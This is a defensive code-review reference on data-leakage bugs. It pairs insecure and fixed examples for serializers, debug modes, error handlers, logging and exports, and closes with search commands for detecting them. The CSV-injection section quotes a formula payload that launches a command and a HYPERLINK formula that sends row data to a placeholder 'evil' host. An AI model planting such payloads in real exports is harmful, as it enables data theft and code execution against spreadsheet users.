# Data Leakage Reference

Load when the diff touches response serialization, error handlers, logging of request data, or any data-export path (CSV, JSON, tarball). The concern is data that *shouldn't* leave the trust boundary being included in a response, log, error message, or exported file.

## The Core Rule

The default of every serializer, error handler, and logger should be "explicit allowlist" not "reflect everything." The bug shapes below all share the property that *some new field silently became visible* because the code was additive-by-default.

## Response Serialization

### Pydantic `extra = "allow"` on a response model

Real: Sentry commit `0c0aae90ac1` (Seer explorer chat). Pydantic model with `Config.extra = "allow"` passed `.dict()` directly to responses, leaking `SeerRunState` internals.

```python
# bad
class SeerState(BaseModel):
    class Config:
        extra = "allow"   # Any posted extra field round-trips into the response.
    user_query: str

@app.post("/chat")
def chat(state: SeerState):
    return state.dict()

# safe
class SeerState(BaseModel):
    class Config:
        extra = "ignore"
    user_query: str
    internal_trace: str = Field(exclude=True)
```

Pydantic v2 default is `extra = "ignore"` but explicit `"allow"` is seen in codebases that pass internal state through a DTO.

### DRF `ModelSerializer` with `fields = '__all__'`

```python
class UserSerializer(ModelSerializer):
    class Meta:
        model = User
        fields = '__all__'   # Columns added later (is_staff, password_hash, api_token) are exposed.
```

Flag every new use on endpoints that read user-supplied fields, especially ones used as response serializers.

### FastAPI: missing `response_model`

```python
@app.get("/users/{id}")
def get_user(id: int):
    return db.query(User).filter_by(id=id).first()   # Returns every column.

# safe
class UserPublic(BaseModel):
    id: int
    display_name: str

@app.get("/users/{id}", response_model=UserPublic)
def get_user(id: int):
    return db.query(User).filter_by(id=id).first()
```

`response_model` acts as an allowlist filter.

### Prisma / Sequelize / Mongoose: returning raw rows

```ts
// bad
const user = await prisma.user.findUnique({ where: { id } });
return res.json(user);                // Full row including password_hash, 2fa_secret, internal flags.

// safe
const user = await prisma.user.findUnique({
  where: { id },
  select: { id: true, displayName: true, avatarUrl: true },
});
return res.json(user);
```

ORM default is to select all columns; DTO-layer filtering (manual or via a DTO library) is required.

### GraphQL introspection in production

Introspection enabled in production lets attackers enumerate every field and mutation, locating exfil surfaces without guessing.

```ts
// bad
const server = new ApolloServer({ typeDefs, resolvers, introspection: true });

// safe
const server = new ApolloServer({
  typeDefs,
  resolvers,
  introspection: process.env.NODE_ENV !== 'production',
});
```

Paired with overly broad field access (see `references/graphql.md`), introspection accelerates exfil.

### Apollo / Yoga debug mode

```ts
const server = new ApolloServer({
  debug: true,   // Verbose errors, including stack traces with source paths and SQL strings.
});
```

### Mass-field over-return

```ts
// bad: return req.body merged into the DB row and then returned
const created = await prisma.user.create({ data: { ...req.body } });
return res.json(created);   // Mass-assignment on input AND leak on output.
```

Mass assignment that changes roles, tenants, or permissions is out of scope unless it also exposes data.

## Error Handlers

### Flask `DEBUG=True` / Werkzeug debugger

`DEBUG=True` in production is a straightforward RCE (Werkzeug debugger's `/console` endpoint, PIN-protected but historically bypassable given any file-read primitive). Even when the `/console` is not reachable, `DEBUG=True` exposes local variables and full stack traces on 500 pages.

```python
# bad (in prod)
app.run(debug=True)
app.config["DEBUG"] = True

# safe
app.config["DEBUG"] = os.environ.get("FLASK_ENV") == "development"
```

### Django `DEBUG=True` in production

Exposes stack traces, local variable values, loaded settings (including secrets unless filtered by `SENSITIVE_SETTINGS` / `@sensitive_variables`), and template source.

### Express `err.stack` in responses

```ts
app.use((err, req, res, next) => {
  res.status(500).json({ error: err.message, stack: err.stack });   // Leaks internal paths.
});
```

Return a generic `{ error: "internal" }` in production, log the stack server-side.

### Next.js error pages

Development shows full stack; production shows a generic page. Check for custom error handlers that leak details via deliberate `console.log` or `res.send(err)` in a `getServerSideProps`.

## Logging

### Request bodies / headers captured wholesale

```python
logger.info("request received", extra={"body": request.get_json()})
```

If the body contains passwords, tokens, or PII, they land in logs. Logs are an exfil vector whenever a compromised log aggregator or a shoulder-surf over a terminal counts.

### Exception messages with full context

```ts
catch (err) {
  logger.error(`Failed to process payment: ${JSON.stringify(paymentDetails)}`, err);
}
```

`paymentDetails` likely includes card numbers or at least tokens. Scrub before logging.

### Sentry-specific (ironic)

When the application uses Sentry for error reporting, PII filtering is Sentry's config responsibility. Still, sending a request body directly through `capture_exception(context={"body": body})` leaks the body to Sentry. Use breadcrumb scrubbing or explicit field allowlists.

## Exports

### CSV / formula injection

Real: Tendenci v12.3.1 Contact Us export — message field written raw to CSV. A message starting with `=10+20+cmd|' /C calc'!A0` executed on open.

`=HYPERLINK("http://evil?x="&A2, "click")` in an exported CSV exfiltrates adjacent row data on click. Categorized under CWE-1236.

Mitigation: prefix every cell value that starts with `=`, `+`, `-`, `@`, tab, or CR with a single quote or escape.

### Tarball / JSON export scope

See `references/getsentry.md` on `export_customer_data.py` pattern. An export that bundles configs, teams, projects should verify per-resource authorization, not just per-organization.

### Download links with embedded tokens

A signed URL delivered by email, with a long expiry and no single-use enforcement, is effectively a data-handing-over primitive. Once the link leaks, the data does.

## Header / Response-Meta Leaks

- Server / framework version headers (`X-Powered-By`, `Server: gunicorn/X.Y`) are minor but real reconnaissance fuel.
- CORS `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true` (browsers reject this combo, but CORS middleware can be configured to reflect the `Origin` header, producing the same effect with credentials).

## Detection Heuristics

For every response-path touch in a diff:

1. **Does the response shape include ORM-row objects directly?** Add a DTO / `response_model` / explicit `select`.
2. **Does the model allow extra fields?** Pydantic `extra = "allow"`, DRF `fields = '__all__'`.
3. **Does the error handler serialize the exception object?** Flag unless filtered.
4. **Does the log call capture request/payload data wholesale?** Flag unless scrubbed.
5. **Does the export path write user-controlled text to CSV?** Require formula escape.

## False-Positive Traps

- Responses that intentionally include what looks like a sensitive field but are scoped to "me" endpoints (the user's own data).
- Error handlers that return generic text in production and verbose detail only when a debug-only feature flag is set.
- Logs that use explicit allowlists / scrubbers.
- DRF `ModelSerializer` on `ReadOnlyModelViewSet` with `fields = '__all__'` where the columns are genuinely public.
- Public marketing / product catalog surfaces where "everything" is intentionally public.

## Diff Heuristics

1. New Pydantic model with `Config.extra = "allow"` used as a response body.
2. New DRF serializer with `fields = '__all__'` on any endpoint.
3. New endpoint returning a raw ORM row without `select` / DTO filtering.
4. New FastAPI endpoint missing `response_model`.
5. `introspection: true` or `debug: true` in a GraphQL server config shipped to prod.
6. `DEBUG = True`, `app.debug = True`, `NODE_ENV !== 'production'` check missing for debug behaviors.
7. Error handler that returns `err.stack`, `err.message` containing paths, or `repr()` of internal objects.
8. Logger calls that capture `request.body`, `request.headers`, or payload objects directly.
9. CSV writer that emits user-controlled strings without formula-prefix escape.
10. Export endpoint expanding its column/field set.

## Verification Commands

```bash
# Pydantic extra
rg -n "extra\s*=\s*['\"]allow['\"]" <project>

# DRF serializer with all
rg -n "fields\s*=\s*['\"]__all__['\"]" <project>

# FastAPI response_model absence
rg -n "@app\.(get|post|put|delete|patch)" <file> | rg -v 'response_model'

# Debug flags
rg -n 'DEBUG\s*=\s*True|app\.debug|debug:\s*true' <project>

# Error stack in responses
rg -n 'err\.stack|e\.stack|traceback\.format' <project>

# Loggers capturing request bodies
rg -n 'logger\.(info|warning|error).*request\.(body|json|data|headers)' <project>

# CSV writers
rg -n 'csv\.writer|csv\.DictWriter|createObjectCsvWriter|json2csv' <project>

# GraphQL introspection
rg -n 'introspection:\s*true' <project>
```
